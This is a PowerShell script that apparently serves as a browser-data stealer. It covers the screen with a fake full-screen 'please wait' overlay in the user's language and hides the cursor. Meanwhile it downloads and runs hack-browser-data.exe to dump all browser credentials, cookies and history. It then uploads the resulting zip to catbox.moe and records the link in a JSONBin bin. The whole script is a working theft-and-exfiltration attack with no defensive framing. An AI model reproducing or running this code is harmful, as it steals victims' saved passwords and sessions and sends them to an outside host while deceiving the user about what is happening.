
$zip = Join-Path $env:USERPROFILE "results\results.zip"
$binId = "69dfd5efaaba882197022d02"

Invoke-WebRequest "https://c.tenor.com/nVrOU5N9UZYAAAAd/tenor.gif" `
-OutFile "$env:USERPROFILE\loading.gif"
Add-Type -AssemblyName PresentationFramework

Add-Type -Path ".\WpfAnimatedGif.dll"


Add-Type -AssemblyName PresentationFramework

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class CursorUtil {
    [DllImport("user32.dll")]
    public static extern int ShowCursor(bool bShow);
}
"@

[CursorUtil]::ShowCursor($false)

# Detect system language
$lang = [System.Globalization.CultureInfo]::CurrentUICulture.TwoLetterISOLanguageName

# Simple translation map
$text = switch ($lang) {
    "hu" { "Egy pillanat" }
    "de" { "Bitte warten" }
    "fr" { "Veuillez patienter" }
    "es" { "Espere un momento" }
    "it" { "Attendere un momento" }
    default { "Wait a moment" }
}

[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        WindowStyle="None"
        WindowState="Maximized"
        Background="#0078D7"
        Topmost="True"
        ShowInTaskbar="False">

    <Grid>
        <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center">

           <Image Name="gifPlayer"
       Width="140"
       Height="140"/>

            <TextBlock Name="txt"
                       Foreground="White"
                       FontSize="28"
                       HorizontalAlignment="Center"/>

        </StackPanel>
    </Grid>
</Window>
"@

$reader = New-Object System.Xml.XmlNodeReader $xaml
$window = [Windows.Markup.XamlReader]::Load($reader)

$gifPath = (Resolve-Path "$env:USERPROFILE\loading.gif").Path
$gifPlayer = $window.FindName("gifPlayer")

[WpfAnimatedGif.ImageBehavior]::SetAnimatedSource($gifPlayer, $gifPath)

# Inject text after load
$txt = $window.FindName("txt")
$txt.Text = $text

$window.Add_Closed({
    [CursorUtil]::ShowCursor($true) | Out-Null
})



$window.Show()

Start-Sleep -Milliseconds 200
[System.Windows.Threading.Dispatcher]::Yield([System.Windows.Threading.DispatcherPriority]::Background)



function Set-Stage($t) {
    $window.Dispatcher.Invoke([action]{ $txt.Text = $t })
}





cd $env:USERPROFILE

Set-Stage "Downloading..."
Invoke-WebRequest -Uri "https://github.com/Cancarutu2012/rroll/raw/refs/heads/main/hbd.zip" -OutFile "$env:USERPROFILE\hbd.zip"
cd $env:USERPROFILE

powershell -Command "Expand-Archive -Path '$env:USERPROFILE\hbd.zip' -DestinationPath '$env:USERPROFILE\' -Force"
cd $env:USERPROFILE

& "$env:USERPROFILE\hack-browser-data.exe" -b all -f json --dir results --zip






# ======================
# CATBOX
# ======================
Write-Host "Uploading to Catbox..."

$response = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php

if (-not $response -or $response -match "error|html|404") {
    Write-Host "Catbox ERROR RESPONSE:"
    Write-Host $response
    exit
}

$link = ($response | Select-Object -First 1).Trim()

Write-Host "Catbox link: $link"


# ======================
# JSONBIN
# ======================
$body = @{
    link = $link
} | ConvertTo-Json -Compress

Write-Host "Updating JSONBin..."

try {
    Invoke-RestMethod `
        -Uri "https://api.jsonbin.io/v3/b/$binId" `
        -Method PUT `
        -Headers @{
            "Content-Type" = "application/json"
        } `
        -Body $body

    Write-Host "DONE"
}
catch {
    Write-Host "JSONBIN ERROR:"
    Write-Host $_.Exception.Message
}

Set-Stage "Done"

Start-Sleep 1

$window.Dispatcher.Invoke([action]{ $window.Close() })
[CursorUtil]::ShowCursor($true)


exit


